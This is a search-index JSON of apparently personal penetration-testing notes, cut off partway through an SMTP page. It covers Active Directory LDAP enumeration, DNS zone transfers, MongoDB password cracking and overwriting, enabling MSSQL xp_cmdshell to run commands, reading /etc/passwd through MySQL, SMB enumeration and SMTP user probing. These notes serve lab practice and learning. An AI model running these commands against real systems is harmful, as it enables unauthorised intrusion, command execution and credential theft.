{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"index.html","text":"__ LeeCyberSec __ Here you will find all about the working through and learning from my experiences about cyber security. RED BLUE","title":"Home"},{"location":"index.html#__leecybersec__","text":"Here you will find all about the working through and learning from my experiences about cyber security. RED BLUE","title":"__LeeCyberSec__"},{"location":"about/index.html","text":"__ LeeCyberSec __ I'm Hades - Red/purple teamer Email: tuvn@protonmail.com Platform: HackTheBox || TryHackMe || PentesterLab Support me at buymeacoffee","title":"About Me"},{"location":"about/index.html#__leecybersec__","text":"I'm Hades - Red/purple teamer Email: tuvn@protonmail.com Platform: HackTheBox || TryHackMe || PentesterLab Support me at buymeacoffee","title":"__LeeCyberSec__"},{"location":"blue-teaming/index.html","text":"__ LeeCyberSec __ About me: Red/purple teamer Contact me: tuvn@protonmail.com","title":"__index__"},{"location":"blue-teaming/index.html#__leecybersec__","text":"About me: Red/purple teamer Contact me: tuvn@protonmail.com","title":"__LeeCyberSec__"},{"location":"penetration-testing/index.html","text":"__ LeeCyberSec __ About me: Red/purple teamer Contact me: tuvn@protonmail.com","title":"__index__"},{"location":"penetration-testing/index.html#__leecybersec__","text":"About me: Red/purple teamer Contact me: tuvn@protonmail.com","title":"__LeeCyberSec__"},{"location":"penetration-testing/active-directory/authentication.html","text":"","title":"Authentication"},{"location":"penetration-testing/active-directory/enumeration.html","text":"Active Directory Enumeration Users and Groups Users Enumeration net user /domain net user hades /domain Group Enumeration net group /domain net localgroup administrators LDAP Enum LDAP://HostName [ :PortNumber ][ /DistinguishedName ] Get Host Name of the Domain Controller [ System.DirectoryServices.ActiveDirectory.Domain ] ::GetCurrentDomain () Enum PS C: \\U sers \\a dmin \\D esktop> . \\l dap-enum.ps1 LDAP://WIN-GFL2HT22DPG.leecybersec.com/DC = leecybersec,DC = local Name Value ---- ----- givenname { admin } <snip> distinguishedname { CN = admin,CN = Users,DC = leecybersec,DC = local } userprincipalname { admin@leecybersec.local } ldap-enum.ps1 # Generate LDAP path, file `ldap-enum.ps1` # .\\ldap-enum.ps1 # LDAP://WIN-GFL2HT22DPG.leecybersec.com/DC=leecybersec,DC=local $domainObj = [ System.DirectoryServices.ActiveDirectory.Domain ] ::GetCurrentDomain () $PDC = ( $domainObj .PdcRoleOwner ) .Name $SearchString = \"LDAP://\" $SearchString + = $PDC + \"/\" $DistinguishedName = \"DC= $( $domainObj .Name.Replace ( '.' , ',DC=' ) )\" $SearchString + = $DistinguishedName $SearchString # Execute LDAP search for each user $Searcher = New-Object System.DirectoryServices.DirectorySearcher ([ ADSI ] $SearchString ) $objDomain = New-Object System.DirectoryServices.DirectoryEntry $Searcher .SearchRoot = $objDomain # supply 0x30000000 (decimal 805306368) to enumerate all users in the domain # $Searcher.filter=\"samAccountType=805306368\" $Searcher .filter = \"name=admin\" $Result = $Searcher .FindAll () Foreach ( $obj in $Result ) { Foreach ( $prop in $obj .Properties ) { $prop } Write-Host \"------------------------\" } Resolving Nested Groups","title":"Enumeration"},{"location":"penetration-testing/active-directory/enumeration.html#active-directory-enumeration","text":"","title":"Active Directory Enumeration"},{"location":"penetration-testing/active-directory/enumeration.html#users-and-groups","text":"Users Enumeration net user /domain net user hades /domain Group Enumeration net group /domain net localgroup administrators","title":"Users and Groups"},{"location":"penetration-testing/active-directory/enumeration.html#ldap-enum","text":"LDAP://HostName [ :PortNumber ][ /DistinguishedName ] Get Host Name of the Domain Controller [ System.DirectoryServices.ActiveDirectory.Domain ] ::GetCurrentDomain () Enum PS C: \\U sers \\a dmin \\D esktop> . \\l dap-enum.ps1 LDAP://WIN-GFL2HT22DPG.leecybersec.com/DC = leecybersec,DC = local Name Value ---- ----- givenname { admin } <snip> distinguishedname { CN = admin,CN = Users,DC = leecybersec,DC = local } userprincipalname { admin@leecybersec.local } ldap-enum.ps1 # Generate LDAP path, file `ldap-enum.ps1` # .\\ldap-enum.ps1 # LDAP://WIN-GFL2HT22DPG.leecybersec.com/DC=leecybersec,DC=local $domainObj = [ System.DirectoryServices.ActiveDirectory.Domain ] ::GetCurrentDomain () $PDC = ( $domainObj .PdcRoleOwner ) .Name $SearchString = \"LDAP://\" $SearchString + = $PDC + \"/\" $DistinguishedName = \"DC= $( $domainObj .Name.Replace ( '.' , ',DC=' ) )\" $SearchString + = $DistinguishedName $SearchString # Execute LDAP search for each user $Searcher = New-Object System.DirectoryServices.DirectorySearcher ([ ADSI ] $SearchString ) $objDomain = New-Object System.DirectoryServices.DirectoryEntry $Searcher .SearchRoot = $objDomain # supply 0x30000000 (decimal 805306368) to enumerate all users in the domain # $Searcher.filter=\"samAccountType=805306368\" $Searcher .filter = \"name=admin\" $Result = $Searcher .FindAll () Foreach ( $obj in $Result ) { Foreach ( $prop in $obj .Properties ) { $prop } Write-Host \"------------------------\" }","title":"LDAP Enum"},{"location":"penetration-testing/active-directory/enumeration.html#resolving-nested-groups","text":"","title":"Resolving Nested Groups"},{"location":"penetration-testing/active-directory/lateral-movement.html","text":"","title":"Lateral Movement"},{"location":"penetration-testing/active-directory/persistent.html","text":"","title":"Persistent"},{"location":"penetration-testing/external-internal/common-services/dns-53.html","text":"DNS 53 Reference Ip address nslookup nslookup > SERVER <IP_DNS> #Select dns server > 127 .0.0.1 #Reverse lookup of 127.0.0.1, maybe... > <IP_MACHINE> #Reverse lookup of a machine, maybe... dig dig axfr cronos.htb @10.10.10.13 dig ANY @<DNS_IP> <DOMAIN> #Any information dig A @<DNS_IP> <DOMAIN> #Regular DNS request dig AAAA @<DNS_IP> <DOMAIN> #IPv6 DNS request dig TXT @<DNS_IP> <DOMAIN> #Information dig MX @<DNS_IP> <DOMAIN> #Emails related dig NS @<DNS_IP> <DOMAIN> #DNS that resolves that name dig -x 192 .168.0.2 @<DNS_IP> #Reverse lookup dig -x 2a00:1450:400c:c06::93 @<DNS_IP> #reverse IPv6 lookup #Use [-p PORT] or -6 (to use ivp6 address of dns) nmap nmap -n --script \"(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport\" <IP> Domain host Options Decription NS Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain. A Also known as a host record, the \"a record\" contains the IP address of a hostname (such as mail.leecybersec.com). MX Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records. PTR PointerRecords are used in reverse lookup zones and are used to find the records associated with an IP address. CNAME Canonical Name Records are used to create aliases for other host records. TXT Text records can contain any arbitrary data and can be used for various purposes, such as domain ownership verification. Using options host -t txt mail.leecybersec.com whois whois leecybersec.com nslookup nslookup leecybersec.com DNSRecon dnsrecon -d leecybersec.com -t axfr dnsrecon -d leecybersec.com -D ~/list-subdomain.txt -t brt DNSenum dnsenum leecybersec.com DNS Zone Transfer nmap --script = dns-zone-transfer -p 53 leecybersec.com Using zone transfer host -l leecybersec.com ns2.leecybersec.com #!/bin/bash if [ -z \" $1 \" ] ; then echo \"[*] Simple Zone transfer script\" echo \"[*] Usage : $0 <domain name> \" exit 0 fi for server in $( host -t ns $1 | cut -d \" \" -f4 ) ; do host -l $1 $server | grep \"has address\" done","title":"dns 53"},{"location":"penetration-testing/external-internal/common-services/dns-53.html#dns-53","text":"","title":"DNS 53"},{"location":"penetration-testing/external-internal/common-services/dns-53.html#reference","text":"","title":"Reference"},{"location":"penetration-testing/external-internal/common-services/dns-53.html#ip-address","text":"","title":"Ip address"},{"location":"penetration-testing/external-internal/common-services/dns-53.html#nslookup","text":"nslookup > SERVER <IP_DNS> #Select dns server > 127 .0.0.1 #Reverse lookup of 127.0.0.1, maybe... > <IP_MACHINE> #Reverse lookup of a machine, maybe...","title":"nslookup"},{"location":"penetration-testing/external-internal/common-services/dns-53.html#dig","text":"dig axfr cronos.htb @10.10.10.13 dig ANY @<DNS_IP> <DOMAIN> #Any information dig A @<DNS_IP> <DOMAIN> #Regular DNS request dig AAAA @<DNS_IP> <DOMAIN> #IPv6 DNS request dig TXT @<DNS_IP> <DOMAIN> #Information dig MX @<DNS_IP> <DOMAIN> #Emails related dig NS @<DNS_IP> <DOMAIN> #DNS that resolves that name dig -x 192 .168.0.2 @<DNS_IP> #Reverse lookup dig -x 2a00:1450:400c:c06::93 @<DNS_IP> #reverse IPv6 lookup #Use [-p PORT] or -6 (to use ivp6 address of dns)","title":"dig"},{"location":"penetration-testing/external-internal/common-services/dns-53.html#nmap","text":"nmap -n --script \"(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport\" <IP>","title":"nmap"},{"location":"penetration-testing/external-internal/common-services/dns-53.html#domain","text":"","title":"Domain"},{"location":"penetration-testing/external-internal/common-services/dns-53.html#host","text":"Options Decription NS Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain. A Also known as a host record, the \"a record\" contains the IP address of a hostname (such as mail.leecybersec.com). MX Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records. PTR PointerRecords are used in reverse lookup zones and are used to find the records associated with an IP address. CNAME Canonical Name Records are used to create aliases for other host records. TXT Text records can contain any arbitrary data and can be used for various purposes, such as domain ownership verification. Using options host -t txt mail.leecybersec.com","title":"host"},{"location":"penetration-testing/external-internal/common-services/dns-53.html#whois","text":"whois leecybersec.com","title":"whois"},{"location":"penetration-testing/external-internal/common-services/dns-53.html#nslookup_1","text":"nslookup leecybersec.com","title":"nslookup"},{"location":"penetration-testing/external-internal/common-services/dns-53.html#dnsrecon","text":"dnsrecon -d leecybersec.com -t axfr dnsrecon -d leecybersec.com -D ~/list-subdomain.txt -t brt","title":"DNSRecon"},{"location":"penetration-testing/external-internal/common-services/dns-53.html#dnsenum","text":"dnsenum leecybersec.com","title":"DNSenum"},{"location":"penetration-testing/external-internal/common-services/dns-53.html#dns-zone-transfer","text":"nmap --script = dns-zone-transfer -p 53 leecybersec.com","title":"DNS Zone Transfer"},{"location":"penetration-testing/external-internal/common-services/dns-53.html#using-zone-transfer","text":"host -l leecybersec.com ns2.leecybersec.com #!/bin/bash if [ -z \" $1 \" ] ; then echo \"[*] Simple Zone transfer script\" echo \"[*] Usage : $0 <domain name> \" exit 0 fi for server in $( host -t ns $1 | cut -d \" \" -f4 ) ; do host -l $1 $server | grep \"has address\" done","title":"Using zone transfer"},{"location":"penetration-testing/external-internal/common-services/ftp-21.html","text":"ftp 21 Check for anonymous access $ ftp $ip $port Connected to <ip>. 220 Microsoft FTP Service Name ( <ip>:<host> ) : anonymous 331 Anonymous access allowed, send identity ( e-mail name ) as password. Password: 230 User logged in . Remote system type is Windows_NT. ftp> FTP Common Commands ftp> passive Passive mode on. ftp> binary 200 Type set to I. ftp> ascii 200 Type set to A. ftp> upload <file> ftp> get <file> ftp> quit 221 Goodbye.","title":"ftp 21"},{"location":"penetration-testing/external-internal/common-services/ftp-21.html#ftp-21","text":"","title":"ftp 21"},{"location":"penetration-testing/external-internal/common-services/ftp-21.html#check-for-anonymous-access","text":"$ ftp $ip $port Connected to <ip>. 220 Microsoft FTP Service Name ( <ip>:<host> ) : anonymous 331 Anonymous access allowed, send identity ( e-mail name ) as password. Password: 230 User logged in . Remote system type is Windows_NT. ftp>","title":"Check for anonymous access"},{"location":"penetration-testing/external-internal/common-services/ftp-21.html#ftp-common-commands","text":"ftp> passive Passive mode on. ftp> binary 200 Type set to I. ftp> ascii 200 Type set to A. ftp> upload <file> ftp> get <file> ftp> quit 221 Goodbye.","title":"FTP Common Commands"},{"location":"penetration-testing/external-internal/common-services/general.html","text":"General Reference Common Ports and Services 0daysecurity Enumeration Service unknown - Port XXX $ amap -d $ip $port amap v5.4 ( www.thc.org/thc-amap ) started at 2020 -09-09 23 :30:39 - APPLICATION MAPPING mode Protocol on <ip>:<port>/tcp matches ftp Dump of identified response from <ip>:<port>/tcp ( by trigger http ) : 0000 : 3232 3020 4d69 6372 6f73 6f66 7420 4654 [ 220 Microsoft FT ] 0010 : 5020 5365 7276 6963 650d 0a35 3030 2043 [ P Service..500 C ] 0020 : 6f6d 6d61 6e64 206e 6f74 2075 6e64 6572 [ ommand not under ] 0030 : 7374 6f6f 642e 0d0a 3530 3020 436f 6d6d [ stood...500 Comm ] 0040 : 616e 6420 6e6f 7420 756e 6465 7273 746f [ and not understo ] 0050 : 6f64 2e0d 0a [ od... ]","title":"general"},{"location":"penetration-testing/external-internal/common-services/general.html#general","text":"","title":"General"},{"location":"penetration-testing/external-internal/common-services/general.html#reference","text":"Common Ports and Services 0daysecurity Enumeration","title":"Reference"},{"location":"penetration-testing/external-internal/common-services/general.html#service-unknown-port-xxx","text":"$ amap -d $ip $port amap v5.4 ( www.thc.org/thc-amap ) started at 2020 -09-09 23 :30:39 - APPLICATION MAPPING mode Protocol on <ip>:<port>/tcp matches ftp Dump of identified response from <ip>:<port>/tcp ( by trigger http ) : 0000 : 3232 3020 4d69 6372 6f73 6f66 7420 4654 [ 220 Microsoft FT ] 0010 : 5020 5365 7276 6963 650d 0a35 3030 2043 [ P Service..500 C ] 0020 : 6f6d 6d61 6e64 206e 6f74 2075 6e64 6572 [ ommand not under ] 0030 : 7374 6f6f 642e 0d0a 3530 3020 436f 6d6d [ stood...500 Comm ] 0040 : 616e 6420 6e6f 7420 756e 6465 7273 746f [ and not understo ] 0050 : 6f64 2e0d 0a [ od... ]","title":"Service unknown - Port XXX"},{"location":"penetration-testing/external-internal/common-services/mongodb-27017.html","text":"MongoDB 27017 Scram Crack $ python3 scram-crack.py Tried 1000 passwords Tried 2000 passwords Tried 3000 passwords Tried 4000 passwords Password found: password123 Connect MongoDB mongo 'mongodb://admin:password123@mongodb0.examples.com' mongo --host mongodb0.examples.com --port 28015 -u \"alice\" -p \"password123\"\" Using MongoDB Step 1: See all your databases: show dbs Step 2: Select the database use your_database_name Step 3: Show the collections show collections This will list all the collections in your selected database. Step 4: See all the data db.collection_name.find () db.collection_name.find () .pretty () Find and update user Find user:1 in collection object db.objects.find ({ _key: /^user:1$/ }) Update password for user:1 db.objects.update ({ _key: /^user:1$/ } , { $set : { password: \" $2 y $12$LMqnkbq1FpTnOzAWTgizbugAOpGJaKl0h7PVHvDraW9e0wK2SR7Zu \" }}) WriteResult ({ \"nMatched\" : 1 , \"nUpserted\" : 0 , \"nModified\" : 1 })","title":"mongodb 27017"},{"location":"penetration-testing/external-internal/common-services/mongodb-27017.html#mongodb-27017","text":"","title":"MongoDB 27017"},{"location":"penetration-testing/external-internal/common-services/mongodb-27017.html#scram-crack","text":"$ python3 scram-crack.py Tried 1000 passwords Tried 2000 passwords Tried 3000 passwords Tried 4000 passwords Password found: password123","title":"Scram Crack"},{"location":"penetration-testing/external-internal/common-services/mongodb-27017.html#connect-mongodb","text":"mongo 'mongodb://admin:password123@mongodb0.examples.com' mongo --host mongodb0.examples.com --port 28015 -u \"alice\" -p \"password123\"\"","title":"Connect MongoDB"},{"location":"penetration-testing/external-internal/common-services/mongodb-27017.html#using-mongodb","text":"Step 1: See all your databases: show dbs Step 2: Select the database use your_database_name Step 3: Show the collections show collections This will list all the collections in your selected database. Step 4: See all the data db.collection_name.find () db.collection_name.find () .pretty ()","title":"Using MongoDB"},{"location":"penetration-testing/external-internal/common-services/mongodb-27017.html#find-and-update-user","text":"Find user:1 in collection object db.objects.find ({ _key: /^user:1$/ }) Update password for user:1 db.objects.update ({ _key: /^user:1$/ } , { $set : { password: \" $2 y $12$LMqnkbq1FpTnOzAWTgizbugAOpGJaKl0h7PVHvDraW9e0wK2SR7Zu \" }}) WriteResult ({ \"nMatched\" : 1 , \"nUpserted\" : 0 , \"nModified\" : 1 })","title":"Find and update user"},{"location":"penetration-testing/external-internal/common-services/mssql-1443.html","text":"MSSQL Broute Force File ms-sql-brute nmap -p 1433 --script ms-sql-brute --script-args userdb = customuser.txt,passdb = custompass.txt <host> Connection Add server $ cat /etc/freetds/freetds.conf <snip> [ Pentest ] host = <ip> port = 1433 Stored password $ cat ~/.sqshrc \\s et username = sa \\s et password = PASSWORD \\s et style = vert $ sqsh -S Pentest 1 > Normal Connection $ sqsh -S mssql -U sa sqsh-2.5.16.1 Copyright ( C ) 1995 -2001 Scott C. Gray Portions Copyright ( C ) 2004 -2014 Michael Peppler and Martin Wesdorp This is free software with ABSOLUTELY NO WARRANTY For more information type '\\warranty' Password: 1 > \\s et style = vert 1 > Execute commands Advanced Option 1 > EXEC sp_configure 'show advanced option' ; 2 > go name: show advanced options minimum: 0 maximum: 1 config_value: 0 run_value: 0 ( return status = 0 ) Config xp_cmdshell 1 > EXEC sp_configure 'show advanced option' , '1' ; 2 > go Configuration option 'show advanced options' changed from 1 to 1 . Run the RECONFIGURE statement to install. ( return status = 0 ) 1 > RECONFIGURE WITH OVERRIDE ; 2 > go 1 > EXEC sp_configure 'xp_cmdshell' , 1 ; 2 > go Configuration option 'xp_cmdshell' changed from 1 to 1 . Run the RECONFIGURE statement to install. ( return status = 0 ) 1 > RECONFIGURE ; 2 > go === Recheck === 1 > EXEC sp_configure 'show advanced option' ; 2 > go name: show advanced options minimum: 0 maximum: 1 config_value: 1 run_value: 1 ( return status = 0 ) ------ Execute commands 1 > xp_cmdshell 'whoami' ; 2 > go output: nt service \\m ssql $sqlexpress output: NULL ( 2 rows affected, return status = 0 )","title":"mssql 1443"},{"location":"penetration-testing/external-internal/common-services/mssql-1443.html#mssql","text":"","title":"MSSQL"},{"location":"penetration-testing/external-internal/common-services/mssql-1443.html#broute-force","text":"","title":"Broute Force"},{"location":"penetration-testing/external-internal/common-services/mssql-1443.html#file-ms-sql-brute","text":"nmap -p 1433 --script ms-sql-brute --script-args userdb = customuser.txt,passdb = custompass.txt <host>","title":"File ms-sql-brute"},{"location":"penetration-testing/external-internal/common-services/mssql-1443.html#connection","text":"","title":"Connection"},{"location":"penetration-testing/external-internal/common-services/mssql-1443.html#add-server","text":"$ cat /etc/freetds/freetds.conf <snip> [ Pentest ] host = <ip> port = 1433","title":"Add server"},{"location":"penetration-testing/external-internal/common-services/mssql-1443.html#stored-password","text":"$ cat ~/.sqshrc \\s et username = sa \\s et password = PASSWORD \\s et style = vert $ sqsh -S Pentest 1 >","title":"Stored password"},{"location":"penetration-testing/external-internal/common-services/mssql-1443.html#normal-connection","text":"$ sqsh -S mssql -U sa sqsh-2.5.16.1 Copyright ( C ) 1995 -2001 Scott C. Gray Portions Copyright ( C ) 2004 -2014 Michael Peppler and Martin Wesdorp This is free software with ABSOLUTELY NO WARRANTY For more information type '\\warranty' Password: 1 > \\s et style = vert 1 >","title":"Normal Connection"},{"location":"penetration-testing/external-internal/common-services/mssql-1443.html#execute-commands","text":"","title":"Execute commands"},{"location":"penetration-testing/external-internal/common-services/mssql-1443.html#advanced-option","text":"1 > EXEC sp_configure 'show advanced option' ; 2 > go name: show advanced options minimum: 0 maximum: 1 config_value: 0 run_value: 0 ( return status = 0 )","title":"Advanced Option"},{"location":"penetration-testing/external-internal/common-services/mssql-1443.html#config-xp_cmdshell","text":"1 > EXEC sp_configure 'show advanced option' , '1' ; 2 > go Configuration option 'show advanced options' changed from 1 to 1 . Run the RECONFIGURE statement to install. ( return status = 0 ) 1 > RECONFIGURE WITH OVERRIDE ; 2 > go 1 > EXEC sp_configure 'xp_cmdshell' , 1 ; 2 > go Configuration option 'xp_cmdshell' changed from 1 to 1 . Run the RECONFIGURE statement to install. ( return status = 0 ) 1 > RECONFIGURE ; 2 > go === Recheck === 1 > EXEC sp_configure 'show advanced option' ; 2 > go name: show advanced options minimum: 0 maximum: 1 config_value: 1 run_value: 1 ( return status = 0 ) ------","title":"Config xp_cmdshell"},{"location":"penetration-testing/external-internal/common-services/mssql-1443.html#execute-commands_1","text":"1 > xp_cmdshell 'whoami' ; 2 > go output: nt service \\m ssql $sqlexpress output: NULL ( 2 rows affected, return status = 0 )","title":"Execute commands"},{"location":"penetration-testing/external-internal/common-services/mysql-3306.html","text":"mysql 3306 Connection mysql -h <host> -u <user> -p<pass> Query show databases ; show tables ; use tables ; select * from users ; Readfile Reading and Writing Files SELECT LOAD_FILE ( '/etc/passwd' )","title":"mysql 3306"},{"location":"penetration-testing/external-internal/common-services/mysql-3306.html#mysql-3306","text":"","title":"mysql 3306"},{"location":"penetration-testing/external-internal/common-services/mysql-3306.html#connection","text":"mysql -h <host> -u <user> -p<pass>","title":"Connection"},{"location":"penetration-testing/external-internal/common-services/mysql-3306.html#query","text":"show databases ; show tables ; use tables ; select * from users ;","title":"Query"},{"location":"penetration-testing/external-internal/common-services/mysql-3306.html#readfile","text":"Reading and Writing Files SELECT LOAD_FILE ( '/etc/passwd' )","title":"Readfile"},{"location":"penetration-testing/external-internal/common-services/nfs-111.html","text":"nfs 111 Find services nmap -sV -p 111 --script = rpcinfo $ip NFS NSE Scripts nmap -p 111 --script nfs* $ip Mount sudo mount -o nolock 192 .168.11.131:/share ~/share","title":"nfs 111"},{"location":"penetration-testing/external-internal/common-services/nfs-111.html#nfs-111","text":"","title":"nfs 111"},{"location":"penetration-testing/external-internal/common-services/nfs-111.html#find-services","text":"nmap -sV -p 111 --script = rpcinfo $ip","title":"Find services"},{"location":"penetration-testing/external-internal/common-services/nfs-111.html#nfs-nse-scripts","text":"nmap -p 111 --script nfs* $ip","title":"NFS NSE Scripts"},{"location":"penetration-testing/external-internal/common-services/nfs-111.html#mount","text":"sudo mount -o nolock 192 .168.11.131:/share ~/share","title":"Mount"},{"location":"penetration-testing/external-internal/common-services/pop3-110.html","text":"pop3 110 Server Connection \u250c\u2500\u2500 ( Hades\u327f192.168.11.140 ) - [ 3 .1:21.8 ] ~ \u2514\u2500$ nc -nC 192 .168.11.141 110 +OK solidstate POP3 server ( JAMES POP3 Server 2 .3.2 ) ready user john +OK pass 123456 +OK Welcome john list +OK 1 743 1 743 . retr 1 +OK Message follows Return-Path: <mailadmin@localhost> Message-ID: < 9564574 .1.1503422198108.JavaMail.root@solidstate> MIME-Version: 1 .0 Content-Type: text/plain ; charset = us-ascii Content-Transfer-Encoding: 7bit Delivered-To: john@localhost Received: from 192 .168.11.142 ([ 192 .168.11.142 ]) by solidstate ( JAMES SMTP Server 2 .3.2 ) with SMTP ID 581 for <john@localhost> ; Tue, 22 Aug 2017 13 :16:20 -0400 ( EDT ) Date: Tue, 22 Aug 2017 13 :16:20 -0400 ( EDT ) From: mailadmin@localhost Subject: New Hires access John, Can you please restrict mindy ' s access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts. Thank you in advance. Respectfully, James . quit +OK Apache James POP3 Server signing off. Thunderbird Mail sudo apt install thunderbird","title":"pop3 110"},{"location":"penetration-testing/external-internal/common-services/pop3-110.html#pop3-110","text":"","title":"pop3 110"},{"location":"penetration-testing/external-internal/common-services/pop3-110.html#server-connection","text":"\u250c\u2500\u2500 ( Hades\u327f192.168.11.140 ) - [ 3 .1:21.8 ] ~ \u2514\u2500$ nc -nC 192 .168.11.141 110 +OK solidstate POP3 server ( JAMES POP3 Server 2 .3.2 ) ready user john +OK pass 123456 +OK Welcome john list +OK 1 743 1 743 . retr 1 +OK Message follows Return-Path: <mailadmin@localhost> Message-ID: < 9564574 .1.1503422198108.JavaMail.root@solidstate> MIME-Version: 1 .0 Content-Type: text/plain ; charset = us-ascii Content-Transfer-Encoding: 7bit Delivered-To: john@localhost Received: from 192 .168.11.142 ([ 192 .168.11.142 ]) by solidstate ( JAMES SMTP Server 2 .3.2 ) with SMTP ID 581 for <john@localhost> ; Tue, 22 Aug 2017 13 :16:20 -0400 ( EDT ) Date: Tue, 22 Aug 2017 13 :16:20 -0400 ( EDT ) From: mailadmin@localhost Subject: New Hires access John, Can you please restrict mindy ' s access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts. Thank you in advance. Respectfully, James . quit +OK Apache James POP3 Server signing off.","title":"Server Connection"},{"location":"penetration-testing/external-internal/common-services/pop3-110.html#thunderbird-mail","text":"sudo apt install thunderbird","title":"Thunderbird Mail"},{"location":"penetration-testing/external-internal/common-services/postgresql-5432.html","text":"postgresql 5432 Connection $ su postgres Password: $ psql psql ( 9 .4.15 ) Type \"help\" for help. Query postgres = # \\list postgres = # \\c database_name pentesterlab = # \\d pentesterlab = # select * from users; Readfile $ psql -U photoblog -W photoblog # CREATE TABLE demo(t text); # COPY demo from '[FILENAME]'; # SELECT * FROM demo;","title":"postgresql 5432"},{"location":"penetration-testing/external-internal/common-services/postgresql-5432.html#postgresql-5432","text":"","title":"postgresql 5432"},{"location":"penetration-testing/external-internal/common-services/postgresql-5432.html#connection","text":"$ su postgres Password: $ psql psql ( 9 .4.15 ) Type \"help\" for help.","title":"Connection"},{"location":"penetration-testing/external-internal/common-services/postgresql-5432.html#query","text":"postgres = # \\list postgres = # \\c database_name pentesterlab = # \\d pentesterlab = # select * from users;","title":"Query"},{"location":"penetration-testing/external-internal/common-services/postgresql-5432.html#readfile","text":"$ psql -U photoblog -W photoblog # CREATE TABLE demo(t text); # COPY demo from '[FILENAME]'; # SELECT * FROM demo;","title":"Readfile"},{"location":"penetration-testing/external-internal/common-services/smb-139-445.html","text":"smb 139,445 SMB Enumeration Guess Server's Version nmap -p 139 ,445 $ip --script = smb-os-discovery Detect Server's version using nmap features. nmap -A 10 .10.10.4 Scanning smbclient smbclient -NL //ip smbclient -L ip --port = 445 --user = Administrator smbmap smbmap -H $ip smbmap -u <user> -H $ip Scanning Vul nmap -p 139 ,445 --script smb-vul* $ip Other Tools NetBIOS information nbtscan -r $ip enum4linux enum4linux -a $ip rpcclient rpcclient -U \"\" $ip Connect to SMB Mount Access sudo mount -t cifs -o user = USERNAME,sec = ntlm,dir_mode = 0077 \"//ip/My Share\" /mnt/cifs sudo mount -t cifs -o username = Administrator,password = 123456 /mnt/win10_share -o port = 445 //ip/Data sudo mount -o nolock $ip :/home ~/home/ smbclient smbclient //ip/folder smbclient \\\\\\\\ ip \\\\ folder -U john smbmap smbmap -H 192 .168.11.135 -u windows_10_1903_x64 -p passwd -r 'Users\\windows_10_1903_x64\\Desktop' Windows \\\\ ip \\a\\w hoami.exe SMB Common Commands srvinfo enumdomusers getdompwinfo querydominfo netshareenum netshareenumall Config Samba /etc/samba/smb.conf min protocol = SMB1","title":"smb 139,445"},{"location":"penetration-testing/external-internal/common-services/smb-139-445.html#smb-139445","text":"","title":"smb 139,445"},{"location":"penetration-testing/external-internal/common-services/smb-139-445.html#smb-enumeration","text":"","title":"SMB Enumeration"},{"location":"penetration-testing/external-internal/common-services/smb-139-445.html#guess-servers-version","text":"nmap -p 139 ,445 $ip --script = smb-os-discovery Detect Server's version using nmap features. nmap -A 10 .10.10.4","title":"Guess Server's Version"},{"location":"penetration-testing/external-internal/common-services/smb-139-445.html#scanning","text":"smbclient smbclient -NL //ip smbclient -L ip --port = 445 --user = Administrator smbmap smbmap -H $ip smbmap -u <user> -H $ip","title":"Scanning"},{"location":"penetration-testing/external-internal/common-services/smb-139-445.html#scanning-vul","text":"nmap -p 139 ,445 --script smb-vul* $ip","title":"Scanning Vul"},{"location":"penetration-testing/external-internal/common-services/smb-139-445.html#other-tools","text":"NetBIOS information nbtscan -r $ip enum4linux enum4linux -a $ip rpcclient rpcclient -U \"\" $ip","title":"Other Tools"},{"location":"penetration-testing/external-internal/common-services/smb-139-445.html#connect-to-smb","text":"","title":"Connect to SMB"},{"location":"penetration-testing/external-internal/common-services/smb-139-445.html#mount-access","text":"sudo mount -t cifs -o user = USERNAME,sec = ntlm,dir_mode = 0077 \"//ip/My Share\" /mnt/cifs sudo mount -t cifs -o username = Administrator,password = 123456 /mnt/win10_share -o port = 445 //ip/Data sudo mount -o nolock $ip :/home ~/home/","title":"Mount Access"},{"location":"penetration-testing/external-internal/common-services/smb-139-445.html#smbclient","text":"smbclient //ip/folder smbclient \\\\\\\\ ip \\\\ folder -U john","title":"smbclient"},{"location":"penetration-testing/external-internal/common-services/smb-139-445.html#smbmap","text":"smbmap -H 192 .168.11.135 -u windows_10_1903_x64 -p passwd -r 'Users\\windows_10_1903_x64\\Desktop'","title":"smbmap"},{"location":"penetration-testing/external-internal/common-services/smb-139-445.html#windows","text":"\\\\ ip \\a\\w hoami.exe","title":"Windows"},{"location":"penetration-testing/external-internal/common-services/smb-139-445.html#smb-common-commands","text":"srvinfo enumdomusers getdompwinfo querydominfo netshareenum netshareenumall","title":"SMB Common Commands"},{"location":"penetration-testing/external-internal/common-services/smb-139-445.html#config-samba","text":"/etc/samba/smb.conf min protocol = SMB1","title":"Config Samba"},{"location":"penetration-testing/external-internal/common-services/smtp-25.html","text":"smtp 25 What is SMTP? Server Connection $ nc -nvC $ip 25 $ telnet $ip 25 VRFY root EXPN SMTP Commands $ helo admin $ mail from:<> $ rcpt to:<nobody> $ data hades . Scanning Vul $ nmap $ip -p 25 --script = smtp-* $ sudo msfconsole -q -x \"setg RHOSTS $ip ; use auxiliary/scanner/smtp/smtp_enum; run; use auxiliary/scanner/smtp/smtp_relay; run; use auxiliary/scanner/smtp/smtp_version; run; exit\" Scripting Scripting python3 smtp-vrfy.py <username> smtp-vrfy.py #!/usr/bin/python3 import socket import sys if len ( sys . argv ) != 2 : print ( \"Usage: python3 sys.argv[0] <username>\" ) sys . exit ( 0 ) s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) connect = s . connect (( '192.168.11.131' , 25 )) banner = s . recv ( 1024 ) print ( banner ) s . send ( 'VRFY ' + sys . argv [ 1 ] + ' \\r\\n ' ) result = s . recv ( 1024 ) print ( result ) s . close ()","title":"smtp 25"},{"location":"penetration-testing/external-internal/common-services/smtp-25.html#smtp-25","text":"","title":"smtp 25"},{"location":"penetration-testing/external-internal/common-services/smtp-25.html#what-is-smtp","text":"","title":"What is SMTP?"},{"location":"penetration-testing/external-internal/common-services/smtp-25.html#server-connection","text":"$ nc -nvC $ip 25 $ telnet $ip 25 VRFY root 